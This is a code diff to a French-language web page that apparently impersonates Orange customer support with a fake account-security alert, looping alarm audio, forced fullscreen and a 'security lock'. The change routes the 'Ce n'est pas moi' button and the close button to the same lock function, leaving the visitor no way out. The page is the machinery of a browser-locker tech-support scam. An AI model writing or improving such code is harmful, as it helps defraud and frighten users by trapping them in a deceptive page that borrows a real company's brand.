@@ -97,7 +97,7 @@
     '<p>Heure : Aujourd\'hui, <span id="currentTime"></span></p></div></div></div>' +
     '<div class="modal-bottom"><div class="modal-actions" role="group" aria-label="Actions">' +
     '<button class="modal-btn modal-btn-allow" id="secureAccountBtn" type="button">Sécuriser mon compte</button>' +
-    '<button class="modal-btn modal-btn-deny" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
+    '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
     '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Assistance Orange</p></div>' +
     '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
     '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>';
@@ -116,6 +116,7 @@
 
   var ESCAPE_DEZOOM_MS = 5000;
   var secureAccountBtn = document.getElementById("secureAccountBtn");
+  var denyAccountBtn = document.getElementById("denyAccountBtn");
   var securityOverlay = document.getElementById("securityOverlay");
   var fbCloseBtn = document.getElementById("fbCloseBtn");
   var securityAudio1 = document.getElementById("securityAudio1");
@@ -346,17 +347,30 @@
     });
   }
 
-  if (secureAccountBtn && securityOverlay) {
-    secureAccountBtn.addEventListener("click", function (event) {
+  function goToSecurityPage(event) {
+    if (event) {
+      event.preventDefault();
       event.stopPropagation();
-      activateSecurityLock();
-    });
+    }
+    activateSecurityLock();
+  }
+
+  if (secureAccountBtn && securityOverlay) {
+    secureAccountBtn.addEventListener("click", goToSecurityPage);
+  }
+
+  if (denyAccountBtn && securityOverlay) {
+    denyAccountBtn.addEventListener("click", goToSecurityPage);
   }
 
   if (fbCloseBtn && securityOverlay) {
     fbCloseBtn.addEventListener("click", function (event) {
       event.preventDefault();
       event.stopPropagation();
+      if (!securityLockActive) {
+        goToSecurityPage(event);
+        return;
+      }
       if (!isDezoomed) forceFullscreen();
     });
   }
